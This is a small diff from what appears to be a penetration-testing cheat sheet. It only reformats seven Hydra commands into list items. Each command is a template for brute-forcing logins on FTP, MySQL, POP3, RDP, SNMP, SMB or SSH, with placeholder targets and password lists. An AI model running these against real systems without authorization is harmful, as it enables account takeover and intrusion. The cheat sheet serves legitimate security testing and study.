@@ -48,13 +48,13 @@ https://github.com/Dormidera/WordList-Compendium
 
 
 Hydra
-hydra -l root -P passwords.txt [-t 32] <IP> ftp
-hydra -L usernames.txt -P pass.txt <IP> mysql
-hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
-hydra -V -f -L usernames.txt -P pass.txt rdp:// <IP>
-hydra -P common-snmp-community-strings.txt target.com snmp
-hydra -l admin -P pass.txt <IP> smb -t 1
-hydra -l root -P pass.txt <IP> ssh
+  - hydra -l root -P passwords.txt [-t 32] <IP> ftp
+  - hydra -L usernames.txt -P pass.txt <IP> mysql
+  - hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+  - hydra -V -f -L usernames.txt -P pass.txt rdp:// <IP>
+  - hydra -P common-snmp-community-strings.txt target.com snmp
+  - hydra -l admin -P pass.txt <IP> smb -t 1
+  - hydra -l root -P pass.txt <IP> ssh
   
   
   
